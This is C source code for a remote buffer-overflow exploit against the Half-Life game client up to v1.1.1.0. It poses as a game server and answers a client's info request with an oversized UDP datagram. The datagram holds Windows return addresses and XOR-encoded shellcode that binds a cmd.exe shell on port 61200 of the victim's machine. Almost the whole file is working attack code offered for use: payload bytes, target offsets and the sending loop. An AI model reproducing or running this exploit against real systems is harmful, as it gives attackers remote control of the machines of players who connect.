/*
 *            m00 Security presents
 *  HalfLife client <=v.1.1.1.0 remote exploit
 *
 *  binds cmd.exe shell on port 61200
 *
 *  Avaiable targets:
 *   1. win2k sp3 en
 *   2. winxp nosp ru
 *   3. winxp sp1 ru
 *   4. win98 se2 (u need change shellcode)
 *
 *  Bug discovered by
 *    Auriemma Luigi [www.pivx.com/luigi]
 *
 *  Authors:
 *    d4rkgr3y [grey_1999_at_mail.ru]
 *    Over_G [overg_at_mail.ru]
 *
 *  U can find us at:
 *    irc.wom.ru@m00
 *    irc.dal.net@m00security
 *
 * PS: m00security.org will be avaiable soon ;)
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netdb.h>

#define PORT 27015

char ping[0x12]=
	"\xff\xff\xff\xff\x6a\x00\x20\x20\x20"
	"\x20\x20\x20\x20\x20\x20\x20\x20\x20";

unsigned char evilbuf[] =
	/* header of HalfLife udp-datagram | do not edit */
	"\xFF\xFF\xFF\xFF\x69\x6E\x66\x6F\x73\x74\x72\x69"
	"\x6E\x67\x72\x65\x73\x70\x6F\x6E\x73\x65\x00\x5c"
	/* 512 bytes for bof */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAAAAAAAAAAAAAAAAAAAA"
	"\x5a\x5a\x5a\x5a" // EIP
	"\x90\x90\x90\x90" // payload for esp
	/* winxp/2k xored portbind shellcode */
	/* If u want to use this xsploit against win9x/ME, change shellcode to another one */
	"\x8B\xC4\x83\xC0\x15\x33\xC9\x66\xB9\xD1\x01\x80\x30\x96\x40\xE2\xFA" // decrypt
	"\x15\x7A\xA2\x1D\x62\x7E\xD1\x97\x96\x96\x1F\x90\x69\xA0\xFE\x18\xD8\x98\x7A\x7E\xF7"
	"\x97\x96\x96\x1F\xD0\x9E\x69\xA0\xFE\x3B\x4F\x93\x58\x7E\xC4\x97\x96\x96\x1F\xD0"
	"\x9A\xFE\xFA\xFA\x96\x96\xFE\xA5\xA4\xB8\xF2\xFE\xE1\xE5\xA4\xC9\xC2\x69\xC0\x9E"
	"\x1F\xD0\x92\x69\xA0\xFE\xE4\x68\x25\x80\x7E\xBB\x97\x96\x96\x1F\xD0\x86\x69\xA0"
	"\xFE\xE8\x4E\x74\xE5\x7E\x88\x97\x96\x96\x1F\xD0\x82\x69\xE0\x92\xFE\x5D\x7B\x6A"
	"\xAD\x7E\x98\x97\x96\x96\x1F\xD0\x8E\x69\xE0\x92\xFE\x4F\x9F\x63\x3B\x7E\x68\x96"
	"\x96\x96\x1F\xD0\x8A\x69\xE0\x92\xFE\x32\x8C\xE6\x51\x7E\x78\x96\x96\x96\x1F\xD0"
	"\xB6\x69\xE0\x92\xFE\x32\x3B\xB8\x7F\x7E\x48\x96\x96\x96\x1F\xD0\xB2\x69\xE0\x92"
	"\xFE\x73\xDF\x10\xDF\x7E\x58\x96\x96\x96\x1F\xD0\xBE\x69\xE0\x92\xFE\x71\xEF\x50"
	"\xEF\x7E\x28\x96\x96\x96\x1F\xD0\xBA\xA5\x69\x17\x7A\x06\x97\x96\x96\xC2\xFE\x97"
	"\x97\x96\x96\x69\xC0\x8E\xC6\xC6\xC6\xC6\xD6\xC6\xD6\xC6\x69\xC0\x8A\x1D\x4E\xC1"
	"\xC1\xFE\x94\x96\x79\x86\x1D\x5A\xFC\x80\xC7\xC5\x69\xC0\xB6\xC1\xC5\x69\xC0\xB2"
	"\xC1\xC7\xC5\x69\xC0\xBE\x1D\x46\xFE\xF3\xEE\xF3\x96\xFE\xF5\xFB\xF2\xB8\x1F\xF0"
	"\xA6\x15\x7A\xC2\x1B\xAA\xB2\xA5\x56\xA5\x5F\x15\x57\x83\x3D\x74\x6B\x50\xD2\xB2"
	"\x86\xD2\x68\xD2\xB2\xAB\x1F\xC2\xB2\xDE\x1F\xC2\xB2\xDA\x1F\xC2\xB2\xC6\x1B\xD2"
	"\xB2\x86\xC2\xC6\xC7\xC7\xC7\xFC\x97\xC7\xC7\x69\xE0\xA6\xC7\x69\xC0\x86\x1D\x5A"
	"\xFC\x69\x69\xA7\x69\xC0\x9A\x1D\x5E\xC1\x69\xC0\xBA\x69\xC0\x82\xC3\xC0\xF2\x37"
	"\xA6\x96\x96\x96\x13\x56\xEE\x9A\x1D\xD6\x9A\x1D\xE6\x8A\x3B\x1D\xFE\x9E\x7D\x9F"
	"\x1D\xD6\xA2\x1D\x3E\x2E\x96\x96\x96\x1D\x53\xC8\xCB\x54\x92\x96\xC5\xC3\xC0\xC1"
	"\x1D\xFA\xB2\x8E\x1D\xD3\xAA\x1D\xC2\x93\xEE\x95\x43\x1D\xDC\x8E\x1D\xCC\xB6\x95"
	"\x4B\x75\xA4\xDF\x1D\xA2\x1D\x95\x63\xA5\x69\x6A\xA5\x56\x3A\xAC\x52\xE2\x91\x57"
	"\x59\x9B\x95\x6E\x7D\x64\xAD\xEA\xB2\x82\xE3\x77\x1D\xCC\xB2\x95\x4B\xF0\x1D\x9A"
	"\xDD\x1D\xCC\x8A\x95\x4B\x1D\x92\x1D\x95\x53\x7D\x94\xA5\x56\x1D\x43\xC9\xC8\xCB"
	"\xCD\x54\x92\x96"
	/* end */
	"\x5C\x00"; // end of udp-HL-datagram. Do not change!

char retw2ksp3[] = "\xc5\xaf\xe2\x77";
char retwxpsp0[] = "\x1c\x80\xf5\x77"; // ntdll.dll :: jmp esp
char retwxpsp1[] = "\xba\x26\xe6\x77";
char retw98se2[] = "\xa9\xbf\xda\x7f";

int main(int argc, char **argv) {
	int sock, sf, len, i;
	u_short port=PORT;
	struct sockaddr_in fukin_addr, rt;
	char buf[0x1000];
	printf("\n\rHalfLife client v.1.1.1.0 remote exploit by m00 Security\n");
	if(argc!=2) {
		printf("
Usage: %s <remote_os>

where os:
1 - win2k sp3 ru
2 - winxp nosp ru
3 - winxp sp1 ru
4 - win98 se2 ru (need another shellcode)

",argv[0]);
		exit(0);
	}
	if(atoi(argv[1])==1) {
		for(i=0;i<4;i++) {
			evilbuf[536+i]=retw2ksp3[i];
		}
	}
	if(atoi(argv[1])==2) {
		for(i=0;i<4;i++) {
			evilbuf[536+i]=retwxpsp0[i];
		}
	}
	if(atoi(argv[1])==3) {
		for(i=0;i<4;i++) {
			evilbuf[536+i]=retwxpsp1[i];
		}
	}
	if(atoi(argv[1])==4) {
		for(i=0;i<4;i++) {
			evilbuf[536+i]=retw98se2[i];
		}
	}

	if((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP))<0) {
		perror("[-] socket()");
		exit(0);
	}
	printf("\n[+] Socket created.\n");
	fukin_addr.sin_addr.s_addr = INADDR_ANY;
	fukin_addr.sin_port        = htons(port);
	fukin_addr.sin_family      = AF_INET;

	if(bind(sock, (struct sockaddr *)&fukin_addr, sizeof(fukin_addr))<0) {
		perror("[-] bind()");
		exit(0);
	}
	printf("[+] Port %i binded.\n", port);
	sf = sizeof(rt);
	while(1) {
		if ((len = recvfrom(sock, buf, sizeof(buf), 0, (struct sockaddr *)&rt, &sf))<0) {
			perror("[-] recv()");
			exit(1);
		}
		printf("[+] Incoming udp datagram: ");
 		for (i=0;i<=len;i++){
			printf("%c",buf[i]);
		}
		printf("\n[~] Identyfication... ");
		if(strstr(buf,"ping")) {
			printf("PING request\n[~] Sending answer... ");
			if(sendto(sock, ping, sizeof(ping), 0, (struct sockaddr *)&rt, sizeof(rt))<0) {
				perror("[-] send()");
				exit(1);
			} else {
				printf("OK\n");
			}
			continue;
		}
		if(strstr(buf,"infostring")) {
			printf("INFOSTRING request\n[~] Attacking... OK\n");
			printf("[+] Now try to connect to: %s:61200\n", inet_ntoa(rt.sin_addr));
			if(sendto(sock, evilbuf, sizeof(evilbuf), 0, (struct sockaddr *)&rt, sizeof(rt))<0) {
				perror("[-] send()");
				exit(1);
			}
			continue;
		}
		printf("unknow request\n");
	}
	close(sock);
	return 0;
}
// mOOOOOOOOOOOOOoooooooooooooooooooooo